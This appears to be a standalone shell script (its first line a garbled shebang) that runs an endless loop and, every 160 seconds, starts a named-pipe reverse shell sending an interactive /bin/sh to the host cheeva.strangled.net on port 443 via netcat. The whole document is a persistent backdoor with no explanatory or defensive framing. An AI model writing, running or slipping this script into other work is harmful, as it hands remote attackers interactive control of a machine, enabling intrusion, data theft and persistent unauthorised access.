£!/bin/sh
while true; do


    cat /tmp/p | /bin/sh -i 2>&1 | nc cheeva.strangled.net 443> /tmp/p &


    sleep 160
done
